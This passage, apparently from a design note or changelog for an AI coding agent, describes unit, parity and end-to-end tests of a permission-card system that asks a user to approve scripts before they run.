the next card, still asks when a script written by `edit_file` is run
(the digest rule), settles at the third position, asks at the middle,
keeps a turn alive through a card open longer than the turn's budget,
times out a turn with no card, and answers an open card with no on Stop.
`tests/test_permission_parity.py` draws the same script on both
providers and finds one card, one rule, one file, and an always given
under one honoured by the other. `e2e/specs/openai-card.spec.ts` starts
a server with the stand-in off and the provider pointed at a fake
upstream speaking the chat-completions stream, sees the card with the
script in it, presses Allow and finds the script in the tree, then
presses Allow always, reloads, asks again and finds no card open.
